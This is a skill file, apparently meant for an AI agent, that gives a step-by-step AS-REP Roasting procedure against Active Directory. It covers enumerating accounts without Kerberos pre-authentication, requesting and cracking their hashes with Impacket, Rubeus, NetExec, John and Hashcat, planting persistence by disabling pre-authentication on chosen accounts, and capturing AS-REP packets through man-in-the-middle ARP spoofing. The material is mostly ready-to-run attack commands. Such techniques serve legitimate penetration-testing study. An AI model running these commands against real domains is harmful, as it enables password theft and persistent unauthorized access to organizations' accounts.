---
name: asreproast
description: How to perform AS-REP Roasting attacks against Active Directory users without Kerberos pre-authentication. Use this skill whenever the user mentions AS-REP, ASREPRoast, Kerberos pre-authentication, AD security testing, or wants to enumerate/crack users without pre-auth. This skill covers enumeration, attack execution, hash cracking, and persistence techniques.
---

# AS-REP Roasting

AS-REP Roasting exploits users who lack the **Kerberos pre-authentication required attribute**. This vulnerability allows you to request authentication for a user from the Domain Controller without needing their password. The DC responds with a message encrypted with the user's password-derived key, which you can crack offline.

## Requirements

- **Target users without pre-authentication**: Users must not have Kerberos pre-authentication enabled
- **Connection to Domain Controller**: Access to send requests and receive encrypted messages
- **Optional domain account**: Having credentials allows efficient identification of vulnerable users via LDAP queries

## Workflow

### 1. Enumerate Vulnerable Users

If you have domain credentials, enumerate users without pre-authentication:

**Windows (PowerView):**
```powershell
Get-DomainUser -PreauthNotRequired -verbose
```

**Linux (bloodyAD):**
```bash
bloodyAD -u user -p 'password' -d domain --host dc_ip get search \
  --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
  --attr sAMAccountName
```

**Linux (Kerbrute - for user enumeration):**
```bash
kerbrute userenum users.txt -d domain --dc dc.domain
```

### 2. Request AS-REP Hashes

**Linux (Impacket GetNPUsers.py):**
```bash
# Try all usernames from a file
python GetNPUsers.py domain/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

# Use domain credentials to extract and target vulnerable users
python GetNPUsers.py domain/user:password -request -format hashcat -outputfile hashes.asreproast
```

**Windows (Rubeus):**
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast /user:username
```

**Windows (ASREPRoast.ps1):**
```powershell
Get-ASREPHash -Username VPN114user -verbose
```

> **Warning**: AS-REP Roasting with Rubeus generates Event ID 4768 with encryption type 0x17 and preauth type 0.

**Linux (NetExec - quick one-liner):**
```bash
# Pull AS-REP for a single user even with blank password
netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast
```

### 3. Crack the Hashes

**John the Ripper:**
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
```

**Hashcat:**
```bash
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```

Hashcat auto-detects mode 18200 (etype 23) for AS-REP roast hashes.

### 4. Persistence (If You Have GenericAll Permissions)

Force pre-authentication not required for a user where you have write permissions:

**Windows (PowerView):**
```powershell
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

**Linux (bloodyAD):**
```bash
bloodyAD -u user -p 'password' -d domain --host dc_ip add uac -f DONT_REQ_PREAUTH 'target_user'
```

## AS-REP Roasting Without Credentials

If you have a man-in-the-middle position, you can capture AS-REP packets as they traverse the network without relying on pre-authentication being disabled. This works for all users on the VLAN.

**ASRepCatcher:**
```bash
# Act as proxy between clients and DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disable ARP spoofing (MITM position obtained differently)
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```

## Quick Reference

| Task | Command |
|------|--------|
| Enumerate (Windows) | `Get-DomainUser -PreauthNotRequired` |
| Enumerate (Linux) | `bloodyAD ... get search --filter '...4194304...'` |
| Request hashes (Linux) | `GetNPUsers.py domain/ -usersfile users.txt -format hashcat` |
| Request hashes (Windows) | `Rubeus.exe asreproast /format:hashcat` |
| Crack (John) | `john --wordlist=rockyou.txt hashes.asreproast` |
| Crack (Hashcat) | `hashcat -m 18200 hashes.asreproast rockyou.txt` |
| Persistence (Windows) | `Set-DomainObject -XOR @{useraccountcontrol=4194304}` |
| Persistence (Linux) | `bloodyAD ... add uac -f DONT_REQ_PREAUTH` |

## Tools Required

- **Impacket** (GetNPUsers.py) - Python-based Kerberos tools
- **Rubeus** - .NET Kerberos tool for Windows
- **PowerView** - PowerShell AD reconnaissance
- **Hashcat** or **John the Ripper** - Password cracking
- **bloodyAD** - Linux AD management tool
- **ASRepCatcher** - MITM AS-REP capture

## References

- [Ired.team - AS-REP Roasting with Rubeus and Hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf - HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [ASRepCatcher on GitHub](https://github.com/Yaxxine7/ASRepCatcher)
- [ASREPRoast.ps1 on GitHub](https://github.com/HarmJ0y/ASREPRoast)
